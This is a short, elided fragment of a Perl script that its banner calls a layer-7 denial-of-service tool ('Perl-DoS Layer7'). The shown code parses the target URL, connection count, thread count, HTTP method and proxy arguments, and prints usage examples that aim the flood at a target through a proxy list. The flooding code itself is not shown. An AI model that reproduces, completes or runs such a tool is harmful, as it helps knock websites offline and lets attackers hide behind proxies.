...
sub comenzar {
	...
	# blackhttp.pl http://target.com 99999999 1000 50.246.120.125:8080 
    $url = $ARGV[0];                # URL
...
if($#ARGV > 3) {
    ...
    print("
[+]---------------------------------------------------------------[+]
                   Perl-DoS Layer7 - by MalinovOVH                  
[+]---------------------------------------------------------------[+]
--> Use: http.pl [Url] [Connection] [Threads] [GET/POST/HEAD] [Proxy]
--> Example : http.pl http://target.com 9999 1000 GET proxies.txt\n");
}